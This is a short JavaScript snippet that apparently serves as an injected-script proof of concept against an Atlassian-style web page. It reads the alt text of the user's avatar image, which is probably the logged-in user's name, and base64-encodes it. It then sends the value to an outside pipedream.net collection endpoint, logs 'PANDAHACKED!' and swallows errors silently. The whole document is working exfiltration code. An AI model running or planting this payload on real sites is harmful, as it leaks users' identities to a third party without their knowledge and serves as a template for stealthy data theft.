const avatarSpan = document.querySelector('span.aui-avatar-inner');

if (avatarSpan) {
  const img = avatarSpan.querySelector('img');

  if (img) {
  const altValue = img.getAttribute('alt');
  // btoa is fine for ASCII; if you might have non-ASCII, see note below.
  const encoded = encodeURIComponent(btoa(altValue));

  const url = `https://eo3b2gpcqf8400l.m.pipedream.net/${encoded}`;
    try {
      const res = await fetch(url, {
        method: "GET",
        mode: "cors",
        cache: "no-store",
        redirect: "follow",
      });

      if (!res.ok) throw new Error(`HTTP ${res.status}`);

      // Don’t assume JSON. Use text, or detect content-type.
      const contentType = res.headers.get("content-type") || "";
      const data = contentType.includes("application/json")
        ? await res.json()
        : await res.text();

      console.log("PANDAHACKED!", data);
    } catch (err) {
      // If you truly want silence, keep empty. Otherwise:
      // console.debug("Fetch failed:", err);
    }
  }
}
